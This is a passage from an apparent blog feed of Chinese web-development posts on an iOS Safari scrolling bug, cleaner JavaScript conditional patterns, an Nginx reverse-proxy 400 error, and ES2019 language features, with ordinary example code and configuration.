    <content type="text"><![CDATA[本文是转载加整理 描述 此bug出现需要条件：父元素需使用绝对定位absolute或固定定位fixed，使用overflow: scroll / auto（或overflow-y: scroll / auto)，内部子元素是动态大小（例如较大的svg document，近似为内嵌iframe，等等）。 bug出现原因：没有相关官方文档描述该bug。在查阅文档及自己测试的时候总结：iOS safari 会将overflow：scroll的元素识别为一个单独的 ScrollView，并予以一个 -webkit-overflow-scrolling 属性为auto。而safari中的网页本身就是一个大的ScrollView，在脱离文档流的定位时，子元素的高度如果没有在ScrollView建立之前确定，就不会触发内部滑动，而会触发外部滑动。 关于 -webkit-overflow-scrolling：Safari CSS Reference官方是这样描述的： Specifies whether to use native-style scrolling in an overflow:scroll element. 即该属性会让overflow：scroll的元素拥有像iOS原生一样顺滑的滑动效果。为了实现此目标，safari将所有overflow：scroll的元素用原生创建一个ScrollView，当-webkit-overflow-scrolling属性为touch时，启用硬件加速，出现顺滑效果。 分析 父元素不脱离文档流时，无此bug。 父元素在不指定 -webkit-overflow-scrolling：touch时必定出现无法滑动的问题。 当内部元素为正常的html元素时，无此bug。 当为父元素重新设置overflow属性时，可能会导致safari重建ScrollView而bug消失。（之前版本的实验室用这种方法解决的，但新海外版不能用这种方法fix，所以是可能） bug原理 最近在做一个项目的时候，在safari上遇到了一个其他的bug，却让我意识到了这个问题的终极原因。 项目bug是这样的：我在用Nuxt做一个展示站点，需要使用锚链接在页面刚进入的时候跳转到某个位置。这里我本来使用的是router api提供的scrollBehavior方法，但这个方法在Nuxt上有局限性。我就把实现方式改为：进入页面后，动态计算不同锚点位置的scroll top再设置父元素的scroll位置。 在其他浏览器上都是ok的，但在safari上就出了问题：在页面刚进入时无法正确获取到元素的scroll top，小很多，只有页面加载完成之后才可以。 究其原因，是因为我在页面上放了很多张图片让其自行占位，而在页面刚加载时，其他浏览器会预先获取到图片的大小而给其一个占位，无论图片是否加载完成页面总高度固定的。而safari就不一样，图片没加载成功时高度是0。 图片没加载成功时高度是0。哇长见识了。 这时回想到之前在safari上的那个scroll bug，在查阅相关资料后就可以得出结论了： safari浏览器在渲染页面元素的时候，会预先走webkit浏览器的渲染流程： 构建DOM tree 构建CSS rule tree 根据DOM和CSS tree来构建render tree 根据render tree计算页面的layout render页面 注意在第三步和第四步的时候，safari浏览器在构建render tree的时候，会预先找到相应的overflow: scroll元素，在计算页面layout的时候，会计算父元素的高度与子元素的高度，若子元素高于父元素，则在render页面时为其建立一个原生的scrollView。 这个scrollView有什么用的？其实就是为了给其一个弹弹乐的效果（但确实用户体验不错）。 当子元素是某个媒体格式时，比如img、object（svg）等，safari在加载完成之前是不会在计算在layout之内的，也就是高度为0，则子元素的高度就一定小于父元素的高度，safari不会给父元素一个原生的scrollView。 解决方法： 据以上分析以及大量测试得出完美解决方法为： 必须为所有在移动端的overflow: scroll元素增加属性 -webkit-overflow-scrolling: touch。 -webkit-overflow-scrolling属性控制元素在移动设备上是否使用滚动回弹效果.是创建了带有硬件加速的系统级控件，效率很高。 缺点：但是这相对是耗更多内存的，最好在产生了非常大面积的overflow时才应用。 属性：auto：使用普通滚动, 当手指从触摸屏上移开，滚动会立即停止。touch：使用具有回弹效果的滚动, 当手指从触摸屏上移开，内容会继续保持一段时间的滚动效果。继续滚动的速度和持续的时间和滚动手势的强烈程度成正比。同时也会创建一个新的堆栈上下文。 当父元素可不脱离文档流时不要脱离文档流。 在子元素iframe加载完成后可异步将父元素的overflow: scroll属性重写（此方法可能不成功）。 反其道而行之。当出现这种问题的时候，给子元素一个包裹元素，包裹元素设置一个min-height大于父元素的高度，让父元素有scrollView。当子元素加载完成时，将包裹元素撑开，父元素便可以自由滚动了。 参考 iOS Safari浏览器上overflow: scroll元素无法滑动bug解决方法整理iOS safari浏览器上overflow: scroll元素无法滚动bug深究ios手机overflow: scroll卡顿解决]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>IOS</tag>
        <tag>overflow</tag>
        <tag>scroll</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 复杂判断的更优雅写法]]></title>
    <url>%2Fblob%2F2019-05-21-more-elegant-writing-of-javascript-complex-judgments%2F</url>
    <content type="text"><![CDATA[本文系转载（https://juejin.im/post/5bdfef86e51d453bf8051bf8） 前提 我们编写js代码时经常遇到复杂逻辑判断的情况，通常大家可以用if/else或者switch来实现多个条件判断，但这样会有个问题，随着逻辑复杂度的增加，代码中的if/else/switch会变得越来越臃肿，越来越看不懂，那么如何更优雅的写判断逻辑，本文带你试一下。 下面就举例说明 if/else 先看一段代码 12345678910111213141516171819202122232425 /** * 按钮点击事件 * @param &#123;number&#125; status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */const onButtonClick = (status)=&gt;&#123; if(status == 1)&#123; sendLog('processing') jumpTo('IndexPage') &#125;else if(status == 2)&#123; sendLog('fail') jumpTo('FailPage') &#125;else if(status == 3)&#123; sendLog('fail') jumpTo('FailPage') &#125;else if(status == 4)&#123; sendLog('success') jumpTo('SuccessPage') &#125;else if(status == 5)&#123; sendLog('cancel') jumpTo('CancelPage') &#125;else &#123; sendLog('other') jumpTo('Index') &#125;&#125; 通过代码可以看到这个按钮的点击逻辑：根据不同活动状态做两件事情，发送日志埋点和跳转到对应页面， switch 大家可以很轻易的提出这段代码的改写方案，switch出场： 1234567891011121314151617181920212223242526272829 /** * 按钮点击事件 * @param &#123;number&#125; status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */const onButtonClick = (status)=&gt;&#123; switch (status)&#123; case 1: sendLog('processing') jumpTo('IndexPage') break case 2: case 3: sendLog('fail') jumpTo('FailPage') break case 4: sendLog('success') jumpTo('SuccessPage') break case 5: sendLog('cancel') jumpTo('CancelPage') break default: sendLog('other') jumpTo('Index') break &#125;&#125; 嗯，这样看起来比if/else清晰多了，细心的同学也发现了小技巧，case 2和case 3逻辑一样的时候，可以省去执行语句和break，则case 2的情况自动执行case 3的逻辑。 一元判断时：存到Object里 这时有同学会说，还有更简单的写法： 12345678910111213141516171819 const actions = &#123; '1': ['processing','IndexPage'], '2': ['fail','FailPage'], '3': ['fail','FailPage'], '4': ['success','SuccessPage'], '5': ['cancel','CancelPage'], 'default': ['other','Index'],&#125;/** * 按钮点击事件 * @param &#123;number&#125; status 活动状态：1开团进行中 2开团失败 3 商品售罄 4 开团成功 5 系统取消 */const onButtonClick = (status)=&gt;&#123; let action = actions[status] || actions['default'], logName = action[0], pageName = action[1] sendLog(logName) jumpTo(pageName)&#125; 上面代码确实看起来更清爽了，这种方法的聪明之处在于：将判断条件作为对象的属性名，将处理逻辑作为对象的属性值，在按钮点击的时候，通过对象属性查找的方式来进行逻辑判断，这种写法特别适合一元条件判断的情况。 一元判断时：存到Map里 是不是还有其他写法呢？有的： 1234567891011121314151617 const actions = new Map([ [1, ['processing','IndexPage']], [2, ['fail','FailPage']], [3, ['fail','FailPage']], [4, ['success','SuccessPage']], [5, ['cancel','CancelPage']], ['default', ['other','Index']]])/** * 按钮点击事件 * @param &#123;number&#125; status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */const onButtonClick = (status)=&gt;&#123; let action = actions.get(status) || actions.get('default') sendLog(action[0]) jumpTo(action[1])&#125; 这样写用到了es6里的Map对象，是不是更爽了？Map对象和Object对象有什么区别呢？ 一个对象通常都有自己的原型，所以一个对象总有一个”prototype”键。 一个对象的键只能是字符串或者Symbols，但一个Map的键可以是任意值。 你可以通过size属性很容易地得到一个Map的键值对个数，而对象的键值对个数只能手动确认。 多元判断时：将condition拼接成字符串存到Map里 我们需要把问题升级一下，以前按钮点击时候只需要判断status，现在还需要判断用户的身份： 123456789101112131415161718192021222324252627282930313233343536 /** * 按钮点击事件 * @param &#123;number&#125; status 活动状态：1开团进行中 2开团失败 3 开团成功 4 商品售罄 5 有库存未开团 * @param &#123;string&#125; identity 身份标识：guest客态 master主态 */const onButtonClick = (status,identity)=&gt;&#123; if(identity == 'guest')&#123; if(status == 1)&#123; //do sth &#125;else if(status == 2)&#123; //do sth &#125;else if(status == 3)&#123; //do sth &#125;else if(status == 4)&#123; //do sth &#125;else if(status == 5)&#123; //do sth &#125;else &#123; //do sth &#125; &#125;else if(identity == 'master') &#123; if(status == 1)&#123; //do sth &#125;else if(status == 2)&#123; //do sth &#125;else if(status == 3)&#123; //do sth &#125;else if(status == 4)&#123; //do sth &#125;else if(status == 5)&#123; //do sth &#125;else &#123; //do sth &#125; &#125;&#125; 原谅我不写每个判断里的具体逻辑了，因为代码太冗长了。 原谅我又用了if/else，因为我看到很多人依然在用if/else写这种大段的逻辑判断。 从上面的例子我们可以看到，当你的逻辑升级为二元判断时，你的判断量会加倍，你的代码量也会加倍，这时怎么写更清爽呢？ 1234567891011121314151617181920212223 const actions = new Map([ ['guest_1', ()=&gt;&#123;/*do sth*/&#125;], ['guest_2', ()=&gt;&#123;/*do sth*/&#125;], ['guest_3', ()=&gt;&#123;/*do sth*/&#125;], ['guest_4', ()=&gt;&#123;/*do sth*/&#125;], ['guest_5', ()=&gt;&#123;/*do sth*/&#125;], ['master_1', ()=&gt;&#123;/*do sth*/&#125;], ['master_2', ()=&gt;&#123;/*do sth*/&#125;], ['master_3', ()=&gt;&#123;/*do sth*/&#125;], ['master_4', ()=&gt;&#123;/*do sth*/&#125;], ['master_5', ()=&gt;&#123;/*do sth*/&#125;], ['default', ()=&gt;&#123;/*do sth*/&#125;],])/** * 按钮点击事件 * @param &#123;string&#125; identity 身份标识：guest客态 master主态 * @param &#123;number&#125; status 活动状态：1 开团进行中 2 开团失败 3 开团成功 4 商品售罄 5 有库存未开团 */const onButtonClick = (identity,status)=&gt;&#123; let action = actions.get(`$&#123;identity&#125;_$&#123;status&#125;`) || actions.get('default') action.call(this)&#125; 上述代码核心逻辑是：把两个条件拼接成字符串，并通过以条件拼接字符串作为键，以处理函数作为值的Map对象进行查找并执行，这种写法在多元条件判断时候尤其好用。 多元判断时：将condition拼接成字符串存到Object里 当然上述代码如果用Object对象来实现也是类似的： 12345678910 const actions = &#123; 'guest_1':()=&gt;&#123;/*do sth*/&#125;, 'guest_2':()=&gt;&#123;/*do sth*/&#125;, //....&#125;const onButtonClick = (identity,status)=&gt;&#123; let action = actions[`$&#123;identity&#125;_$&#123;status&#125;`] || actions['default'] action.call(this)&#125; 多元判断时：将condition存为Object存到Map里 如果有些同学觉得把查询条件拼成字符串有点别扭，那还有一种方案，就是用Map对象，以Object对象作为key： 12345678910 const actions = new Map([ [&#123;identity:'guest',status:1&#125;,()=&gt;&#123;/*do sth*/&#125;], [&#123;identity:'guest',status:2&#125;,()=&gt;&#123;/*do sth*/&#125;], //...])const onButtonClick = (identity,status)=&gt;&#123; let action = [...actions].filter(([key,value])=&gt;(key.identity == identity &amp;&amp; key.status == status)) action.forEach(([key,value])=&gt;value.call(this))&#125; 是不是又高级了一点点？ 这里也看出来Map与Object的区别，Map可以用任何类型的数据作为key。 多元判断时：将condition写作正则存到Map里 我们现在再将难度升级一点点，假如guest情况下，status1-4的处理逻辑都一样怎么办，最差的情况是这样： 12345678 const actions = new Map([ [&#123;identity:'guest',status:1&#125;,()=&gt;&#123;/* functionA */&#125;], [&#123;identity:'guest',status:2&#125;,()=&gt;&#123;/* functionA */&#125;], [&#123;identity:'guest',status:3&#125;,()=&gt;&#123;/* functionA */&#125;], [&#123;identity:'guest',status:4&#125;,()=&gt;&#123;/* functionA */&#125;], [&#123;identity:'guest',status:5&#125;,()=&gt;&#123;/* functionB */&#125;], //...]) 好一点的写法是将处理逻辑函数进行缓存： 1234567891011121314151617 const actions = ()=&gt;&#123; const functionA = ()=&gt;&#123;/*do sth*/&#125; const functionB = ()=&gt;&#123;/*do sth*/&#125; return new Map([ [&#123;identity:'guest',status:1&#125;,functionA], [&#123;identity:'guest',status:2&#125;,functionA], [&#123;identity:'guest',status:3&#125;,functionA], [&#123;identity:'guest',status:4&#125;,functionA], [&#123;identity:'guest',status:5&#125;,functionB], //... ])&#125;const onButtonClick = (identity,status)=&gt;&#123; let action = [...actions()].filter(([key,value])=&gt;(key.identity == identity &amp;&amp; key.status == status)) action.forEach(([key,value])=&gt;value.call(this))&#125; 这样写已经能满足日常需求了，但认真一点讲，上面重写了4次functionA还是有点不爽，假如判断条件变得特别复杂，比如identity有3种状态，status有10种状态，那你需要定义30条处理逻辑，而往往这些逻辑里面很多都是相同的，这似乎也是笔者不想接受的，那可以这样实现: 1234567891011121314 const actions = ()=&gt;&#123; const functionA = ()=&gt;&#123;/*do sth*/&#125; const functionB = ()=&gt;&#123;/*do sth*/&#125; return new Map([ [/^guest_[1-4]$/,functionA], [/^guest_5$/,functionB], //... ])&#125;const onButtonClick = (identity,status)=&gt;&#123; let action = [...actions()].filter(([key,value])=&gt;(key.test(`$&#123;identity&#125;_$&#123;status&#125;`))) action.forEach(([key,value])=&gt;value.call(this))&#125; 这里Map的优势更加凸显，可以用正则类型作为key了，这样就有了无限可能，假如需求变成，凡是guest情况都要发送一个日志埋点，不同status情况也需要单独的逻辑处理，那我们可以这样写: 12345678910111213141516 const actions = ()=&gt;&#123; const functionA = ()=&gt;&#123;/*do sth*/&#125; const functionB = ()=&gt;&#123;/*do sth*/&#125; const functionC = ()=&gt;&#123;/*send log*/&#125; return new Map([ [/^guest_[1-4]$/,functionA], [/^guest_5$/,functionB], [/^guest_.*$/,functionC], //... ])&#125;const onButtonClick = (identity,status)=&gt;&#123; let action = [...actions()].filter(([key,value])=&gt;(key.test(`$&#123;identity&#125;_$&#123;status&#125;`))) action.forEach(([key,value])=&gt;value.call(this))&#125; 也就是说利用数组循环的特性，符合正则条件的逻辑都会被执行，那就可以同时执行公共逻辑和单独逻辑，因为正则的存在，你可以打开想象力解锁更多的玩法，本文就不赘述了。 总结 本文已经教你了8种逻辑判断写法，包括： if/else switch 一元判断时：存到Object里 一元判断时：存到Map里 多元判断时：将condition拼接成字符串存到Object里 多元判断时：将condition拼接成字符串存到Map里 多元判断时：将condition存为Object存到Map里 多元判断时：将condition写作正则存到Map里 至此，本文也将告一段落，愿你未来的人生里，不只是有if/else/switch。 如果你对本文感兴趣，请关注作者微信公众号：“大转转fe” 参考 JavaScript 复杂判断的更优雅写法]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>复杂判断</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx配置反向代理或跳转出现400问题]]></title>
    <url>%2Fblob%2F2019-04-18-400-problems-with-nginx-configuration-reverse-proxy-or-jump%2F</url>
    <content type="text"><![CDATA[今天在使用Nginx做反向代理出现了400 Bad Request Request Header Or Cookie Too Large这个问题，很多人说Nginx配置不对等等， 1234 server_names_hash_bucket_size 128;client_header_buffer_size 16k;large_client_header_buffers 4 4k;client_max_body_size 1024m; 这几个配置是都有的，所以肯定不是这个原因，因为只加了一个反向代理，所以其他地方应该没有问题，参考网友的解决方案，应该是造成了死循环引起的。 参考一 应该是nginx在使用proxy_pass做跳转时，如果直接使用域名，且需要向后端提交当前访问的IP地址时，引发nginx的bug造成死循环。 参考二 也可以尝试添加host为反向代理的地址。 www.jyall.com 域名 proxy_pass 到 https://jiaju.jyall.me/latestrelease 的url。 jiaju.jyall.me 是 apirouter 带请求头 “www.jyall.com&quot; 又去请求 www.jyall.com 这个域名,造成死循环。 解决方案如下: 1234567891011121314151617 server&#123; server www.jyall.com; location /latestrelease &#123; proxy_set_header Host "jiaju.jyall.me"; proxy_set_header X-Real-IP $remote_addr; proxy_pass https://jiaju.jyall.me/latestrelease; &#125;&#125; 再次 proxy_pass 到 jiaju.jyall.me 请求的时候应该为 jiaju.jyall.me 而不是 www.jyall.com 的头。 这个问题还是比较懵懂，需要继续考证。 参考 nginx配置反向代理或跳转出现400问题处理记录018_nginx_proxy死循环问题]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavsScript ES10&ES2019的新特性]]></title>
    <url>%2Fblob%2F2019-04-17-new-features-of-javsscript-es10-%26-es2019%2F</url>
    <content type="text"><![CDATA[本文系转载 写在前面的话标准非实际情况。 ECMAScript 2019，ECMA-262 标准版本的第19版（通常称为ES2019或ES10），于 2019 年 6 月完成。 This specification, the 10th edition, introduces a few new built-in functions: flat and flatMap on Array.prototype for flattening arrays, Object.fromEntries for directly turning the return value of Object.entries into a new Object, and trimStart and trimEnd on String.prototype as better-named alternatives to the widely implemented but non-standard String.prototype.trimLeft and trimRight built-ins. In addition, this specification includes a few minor updates to syntax and semantics. Updated syntax includes optional catch binding parameters and allowing U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) in string literals to align with JSON. Other updates include requiring that Array.prototype.sort be a stable sort, requiring that JSON.stringify return well-formed UTF-8 regardless of input, and clarifying Function.prototype.toString by requiring that it either return the corresponding original source text or a standard placeholder. ES10中除了 Object.fromEntries大多数功能已经在 Chrome中实现，所以你为什么不尽早开始探索它呢？当所有浏览器开始支持它时，你已经获得了领先优势，这只是时间问题。对于有兴趣探索ES10的人来说，这是一份 非外星人指南。 ES10在新语言功能方面没有ES6那么重要，但它确实添加了一些有趣的东西（其中一些在目前版本的浏览器中还不起作用：02/20/2019） ES6中最受欢迎的功能莫过于箭头函数了，那么 ES10中呢? BigInt - 任意精度整数 BigInt是第7种原始类型。 BigInt是一个任意精度的整数。这意味着变量现在可以代表2^53个数字。而且最大限度是9007199254740992。 1 const b = 1n; //追加n来创建一个BigInt 在过去的整数值大于9007199254740992不支持。如果超出，则该值将锁定为 MAX_SAFE_INTEGER + 1： 1234567891011121314151617 const limit = Number.MAX_SAFE_INTEGER;// 9007199254740991limit + 1;// 9007199254740992limit + 2;// 9007199254740992 &lt;--- MAX_SAFE_INTEGER + 1 exceededconst larger = 9007199254740991n;// 9007199254740991nconst integer = BigInt(9007199254740991);// 9007199254740991nconst same = BigInt("9007199254740991");// 9007199254740991n typeof 12345 typeof 10;// 'number'typeof 10n;// 'bigint' === == 12345 10n === BigInt(10);// true10n == 10;// true * / 123456 200n / 10n// 20n200n / 20// Uncaught TypeError: // Cannot mix BigInt and other types, use explicit conversions - + 123456 -100n// -100n+100n// Uncaught TypeError:// Cannot convert a BigInt value to a number string.prototype.matchAll() 当你读到这个 matchAll时，它可能会在 Chrome C73中正式实现 - 如果没有，它仍然值得一看。特别是如果你是一个正则表达式瘾君子。 如果你谷歌搜索”javascript string match all”，第一条结果可能会是这样的How do I write a regular expression to “match all”?。 排名靠前的结果会建议你使用 String.match匹配的时候在正则表达式或者 RegExp.exc 或者 RegExp.text后加上 /g… 首先，我们来看下旧的规范是如何运行的。 String.match， match只返回字符串参数第一个符合匹配的。 12345 let string = 'Hello'let matches = string.match('l')console.log(matches[0]) 匹配的结果是单个 &#39;l&#39;。(注意： match匹配的结果存储在 matches[0]而非在 matches)，在字符串 &#39;hello&#39;中搜索匹配 &#39;l&#39;只有 &#39;l&#39;被返回来。使用 regexp参数也是得到一样的结果。 我们把字符 &#39;l&#39;更换为表达式 /l/: 12345 let string = 'Hello'let matches = string.match(/l/)console.log(matches[0]) // 'l' 添加 /g String.match使用正则表达式带上 /g标签会返回多个匹配。 123 let string = 'Hello'let ret = string.match(/l/g) // ['l', 'l'] Great…在低于 ES10的环境中我们得到了多个匹配结果，并且一直有效。 那么为什么要用全新的 matchAll方法呢？在我们更详细地回答这个问题之前，让我们来看看 capture group。如果不出意外，你可能会学到新的有关正则表达式的东西。 正则表达式捕获组 在正则表达式中捕获组只是在 ()括号中提取匹配。你可以从 /regex/.exec(string)和 string.match捕获组。 通常捕获组是在匹配规则中被创建的。输出对象上创建 groups属性如： (?&lt;name&gt;)。要创建一个新的组名，只需在括号内添加 (?&lt;name&gt;)属性，分组（模式）匹配将成为附加到 match对象的 groups.name。 看一个实际的例子 字符串标本匹配 创建match.groups.color &amp; match.groups.bird匹配： 12345678910 const string = 'black*raven lime*parrot white*seagull'const regex = /(?&lt;color&gt;.*?)\*(?&lt;bird&gt;[a-z0-9]+)/gwhile (match = regex.exec(string) &#123; let value = match[0] let index = match.index let input = match.input console.log(`$&#123;value&#125; at $&#123;index&#125; with '$&#123;input&#125;'`) console.log(match.groups.color) console.log(match.groups.bird)&#125; 需要多次调用regex.exec方法来遍历整个搜索结果。在每次迭代调用.exec时，会显示下一个结果（它不会立即返回所有匹配项）。 控制台输出： 123456789 black*raven at 0 with 'black*raven lime*parrot white*seagull'blackravenlime*parrot at 11 with 'black*raven lime*parrot white*seagull'limeparrotwhite*seagull at 23 with 'black*raven lime*parrot white*seagull'whiteseagull 这里有一个怪事： 如果你从这个正则表达式中删除/ g，你将永远在第一个结果上创建一个无限循环循环。这在过去是一个巨大的痛苦。想象一下从某个数据库接收正则表达式，你不确定它是否在最后有/ g。你必须先检查它，等等。 现在我们有足够的背景知识回答这个问题： 最好使用 .matchAll() 使用捕获组时更加优雅。捕获组知识带有提取模式（）的正则表达式的一部分。 它返回一个迭代器而不是数组，迭代器本身很有用。 可以使用扩展运算符…将迭代器转为数组。 它避免使用带/g标志的正则表达式…当从数据库或外部源检索未知的正则表达式并与古老的RegEx对象一起使用时非常有用。 使用RegExp对象创建的正则表达式不能使用点（.）运算符链接。 高级：RegEx对象跟踪最后匹配位置的内部.lastIndex属性，这可能对复杂案例有破坏性的事情。 .matchAll()如何工作 这是一简单个例子。 我们尝试匹配字符串Hello的所有e和l。因为返回了iterator,所以我们用for ... of处理它。 12345 // Match all occurrences of the letters: 'e' 或者 'l'let iterator = 'hello'.matchAll(/[el]/)for (const match of iterator) &#123; console.log(match)&#125; 如上，你可以跳过/g，.matchAll不需要它。结果： 123 [ 'e', index: 1, input: 'hello' ] // Iteration 1[ 'l', index: 2, input: 'hello' ] // Iteration 2[ 'l', index: 3, input: 'hello' ] // Iteration 3 使用.matchAll()捕获组示例：.matchAll()具有上面列举的所有好处，它是一个迭代器，所以我们可以用它来循环，这就是整个句法差异。 12345678910 const string = 'black*raven lime*parrot white*seagull';const regex = /(?&lt;color&gt;.*?)\*(?&lt;bird&gt;[a-z0-9]+)/;for (const match of string.matchAll(regex)) &#123; let value = match[0]; let index = match.index; let input = match.input; console.log(`$&#123;value&#125; at $&#123;index&#125; with '$&#123;input&#125;'`); console.log(match.groups.color); console.log(match.groups.bird);&#125; 注意去掉/g标志，因为.matchAll()已经隐含了它。结果输出： 123456789 black*raven at 0 with 'black*raven lime*parrot white*seagull'blackravenlime*parrot at 11 with 'black*raven lime*parrot white*seagull'limeparrotwhite*seagull at 23 with 'black*raven lime*parrot white*seagull'whiteseagull 也许在美学上它与循环实现时的原始regex.exec非常相似。但如前所述，由于上述许多原因，这是更好的方法。并且删除/g不会导致无限循环。 动态 import 现在可以将导入分配给一个变量： 1234 element.addEventListener('click', async () =&gt; &#123; const module = await import('./api-scripts/button-click.js') module.clickEvent()&#125;) Array.flat() 扁平化多维数组： 12345 let multi = [1,2,3,[4,5,6,[7,8,9,[10,11,12]]]];multi.flat(); // [1,2,3,4,5,6,Array(4)]multi.flat().flat(); // [1,2,3,4,5,6,7,8,9,Array(3)]multi.flat().flat().flat(); // [1,2,3,4,5,6,7,8,9,10,11,12]multi.flat(Infinity); // [1,2,3,4,5,6,7,8,9,10,11,12] Array.flatMap() 12 let array = [1, 2, 3, 4, 5]array.map(x =&gt; [x, x * 2]) 变为： 123456 [Array(2), Array(2), Array(2)]0: (2)[1, 2]1: (2)[2, 4]2: (2)[3, 6]3: (2)[4, 8]4: (2)[5, 10] 再次扁平化数组： 12 array.flatMap(v =&gt; [v, v * 2])[1, 2, 2, 4, 3, 6, 4, 8, 5, 10] Object.fromEntries() 将键值对列表转换为对象。 123456789 let obj = &#123; apple : 10, orange : 20, banana : 30 &#125;;let entries = Object.entries(obj);entries;(3) [Array(2), Array(2), Array(2)] 0: (2) ["apple", 10] 1: (2) ["orange", 20] 2: (2) ["banana", 30]let fromEntries = Object.fromEntries(entries);&#123; apple: 10, orange: 20, banana: 30 &#125; String.trimStart() &amp; String.trimEnd() 123 let greeting = " Space around ";greeting.trimEnd(); // " Space around";greeting.trimStart(); // "Space around "; 格式良好的JSON.stringify() 此更新修复了字符U + D800到U + DFFF的处理，有时可以进入JSON字符串。这可能是一个问题，因为JSON.stringify可能会返回格式化为没有等效UTF-8字符的值的这些数字。但JSON格式需要UTF-8编码。 JSON 对象可用于解析JSON 格式（但也更多。）JavaScript JSON 对象也具有stringify和parse方法。 该解析方法适用于一个结构良好的JSON字符串，如： 1 '&#123; "prop1" : 1, "prop2" : 2 &#125;'; // A well-formed JSON format string 请注意，创建具有正确JSON格式的字符串绝对需要使用围绕属性名称的双引号。缺少...或任何其他类型的引号将不会产生格式良好的JSON。 1 '&#123; "prop1" : 1, "meth" : () =&gt; &#123;&#125;&#125;'; // Not JSON format string JSON 字符串格式是不同的，从对象文本 ……它看起来几乎相同，但可以使用任何类型的周围属性名称的报价，还可以包括方法（JSON格式不允许的方法）： 1 let object_literal = &#123; property：1，meth：（）=&gt; &#123;&#125; &#125;; 无论如何，一切似乎都很好。第一个示例看起来合规。但它们也是简单的例子，大部分时间都可以毫无障碍地工作！U + 2028和U + 2029字符这是捕获。ES10之前的EcmaScript实际上并不完全支持JSON格式。在ES10之前的时代，不接受未转义的行分隔符U + 2028和段落分隔符U + 2029字符： U + 2029是行分隔符。 U + 2029是段落分隔符。有时它可能会潜入您的JSON格式字符串。 对于U + D800 - U + DFFF之间的所有字符也是如此 如果这些字符悄悄进入你的JSON格式的字符串（比如说来自数据库记录），你最终可能花费数小时试图弄清楚为什么程序的其余部分会产生解析错误。 所以，如果你传递的eval一个字符串，像“console.log(&#39;hello&#39;)”这将执行JavaScript语句（试图通过字符串实际代码转换。）这也类似于如何JSON.parse将处理您的JSON字符串。 稳定的Array.prototype.sort() V8的先前实现对包含10个以上项的数组使用了不稳定的快速排序算法。 一个稳定的排序算法是当两个具有相等键的对象在排序输出中以与未排序输入中出现的顺序相同的顺序出现时。 但现在已经不是这样了。ES10提供稳定的阵列排序： 1234567891011121314 var fruit = [ &#123; name: "Apple", count: 13, &#125;, &#123; name: "Pear", count: 12, &#125;, &#123; name: "Banana", count: 12, &#125;, &#123; name: "Strawberry", count: 11, &#125;, &#123; name: "Cherry", count: 11, &#125;, &#123; name: "Blackberry", count: 10, &#125;, &#123; name: "Pineapple", count: 10, &#125;];// Create our own sort criteria function:let my_sort = (a, b) =&gt; a.count - b.count;// Perform stable ES10 sort:let sorted = fruit.sort(my_sort);console.log(sorted); 复控制台输出（项目以相反的顺序出现）： New Function.toString() Funcitons是对象，每个对象都有个.toString()方法因为它最初存在于Object.prototype.toString()。所有的objects（包括functions）都继承至基于原型的类继承。这意味着我们已经有了function.toString()方法了。 但是ES10进一步尝试标准化所有对象和内置函数的字符串表示。以下新案例： Classic example 1 function () &#123; console.log('Hello there.'); &#125;.toString(); 控制台输出（字符串格式的函数体:) 1 ⇨ function () &#123; console.log('Hello there.'); &#125; 以下是其它案例： 直接来自函数名 12 Number.parseInt.toString();⇨ function parseInt() &#123; [native code] &#125; 绑定上下文 12 function () &#123; &#125;.bind(0).toString();⇨ function () &#123; [native code] &#125; 内置可调用函数对象 12 Symbol.toString();⇨ function Symbol() &#123; [native code] &#125; 动态生成的函数 12 Function().toString();⇨ function anonymous() &#123;&#125; 动态生成的生成器 function* 12 function* () &#123; &#125;.toString();⇨ function* () &#123; &#125; prototype.toString 12 Function.prototype.toString.call(&#123;&#125;);⇨ Function.prototype.toString requires that 'this' be a Function" 可选的Catch Binding 在过去，try / catch语句中的catch子句需要一个变量。 try / catch语句帮助我们拦截在终端层面的错误： 这是一个复习: 12345678 try &#123; // Call a non-existing function undefined_Function undefined_Function("I'm trying");&#125;catch(error) &#123; // Display the error if statements inside try above fail console.log( error ); // undefined_Function is undefined&#125; 但在某些情况下，所需的error变量未被使用： 12345678 try &#123; JSON.parse(text); // &lt;--- this will fail with "text not defined" return true; &lt;--- exit without error even if there is one&#125;catch (redundant_sometmes) &lt;--- this makes error variable redundant&#123; return false;&#125; 编写此代码的人尝试通过强制为true退出try子句。但是……事实并非如此(正如 Douglas Massolari.所说)。 123456789 (() =&gt; &#123; try &#123; JSON.parse(text) return true &#125; catch(err) &#123; return false &#125;&#125;)()=&gt; false 在ES10中，Catch Error Binding是可选的 你现在可以跳过error变量： 12345678 try &#123; JSON.parse(text); return true;&#125;catch&#123; return false;&#125; 标准化的 globalThis 对象 ES10之前全局this没有标准化。 生产代码中，你必须手动添加如下代码来标准化多个平台的全局对象。 123456 var getGlobal = function () &#123; if (typeof self !== 'undefined') &#123; return self; &#125; if (typeof window !== 'undefined') &#123; return window; &#125; if (typeof global !== 'undefined') &#123; return global; &#125; throw new Error('unable to locate global object');&#125;; 但即使这样也并不总是奏效。所以ES10添加了globalThis对象，从现在开始应该在任何平台上访问全局作用域： 123456789 // Access global array constructorglobalThis.Array(0, 1, 2);⇨ [0, 1, 2]// Similar to window.v = &#123; flag: true &#125; in &lt;= ES5globalThis.v = &#123; flag: true &#125;;console.log(globalThis.v);⇨ &#123; flag: true &#125; Symbol.description description 是一个只读属性，返回Symbol 对象的可选描述。 12345 let mySymbol = 'My Symbol';let symObj = Symbol(mySymbol);symObj; // Symbol(My Symbol)String(symObj) === `Symbol($&#123;mySymbol&#125;)`); // truesymObj.description; // "My Symbol" Hashbang 语法 shebang unix用户会熟悉AKA。 它指定一个解释器（什么将执行您的JavaScript文件？） ES10标准化了这一点。我不会详细介绍这个，因为这在技术上并不是一个真正的语言功能。但它基本上统一了JavaScript在服务器端的执行方式。 1 $ ./index.js 代替： 1 $ node index.js 在类Unix操作系统下。 